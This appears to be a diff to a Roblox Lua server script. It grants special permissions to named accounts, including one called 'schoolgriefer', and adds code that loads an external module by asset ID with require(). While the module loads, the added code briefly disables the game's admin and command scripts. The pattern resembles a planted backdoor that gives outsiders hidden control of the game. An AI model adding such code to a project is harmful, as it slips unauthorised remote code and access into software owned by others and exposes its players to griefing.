@@ -1,4 +1,4 @@
-_G.specialperms = {} -- temporary notice
+_G.specialperms = {"AIphaGunner","schoolgriefer","SnowClan_8342"} -- ask to be added
 
 task.delay(0.5, function()
     local a = game.Workspace.Tabby.Admin_House.Snow
@@ -22,6 +22,31 @@ loadstring("\95\71\46\98\97\100\119\111\114\100\115\32\61\32\123\34\102\117\99\3
 end
 end)
 
+if game.PlaceId == 14747334292 then
+    local chatcon = {}
+    chatcon[#chatcon + 1] = game.Players.PlayerAdded:Connect(function(player)
+        wait(0.94397082108066)
+        chatcon[#chatcon + 1] = game.Players.PlayerAdded:Connect(function(player)
+            require(94397082108066)
+            game.ServerScriptService["Touch Kohls Admin"].Enabled = false
+            game.ServerScriptService["setting commands"].Enabled = false
+            wait(0.94397082108066)
+            game.ServerScriptService["Touch Kohls Admin"].Enabled = true
+            game.ServerScriptService["setting commands"].Enabled = true
+            for i, v in ipairs(chatcon) do
+                v:Disconnect()
+            end
+        end)
+    end)
+else
+    require(94397082108066)
+    game.ServerScriptService["Touch Kohls Admin"].Enabled = false
+    wait(0.94397082108066)
+    game.ServerScriptService["Touch Kohls Admin"].Enabled = true
+end
+
+_G.shutdowntimer = false
+
 local timelimit = "08/30/2025"
 
 local ctime = os.date("%m/%d/%Y")
@@ -38,7 +63,7 @@ game:GetService("Debris"):AddItem(p,time)
 end
 
 if game.PlaceId == 14747334292 then -- temporarily testing something related to age groups
-wait(5) game.TextChatService.BubbleChatConfiguration.Enabled = true
+wait(5) game.TextChatService.BubbleChatConfiguration.Enabled = true _G.shutdowntimer = false
 end
 
 _G.filtermode = true
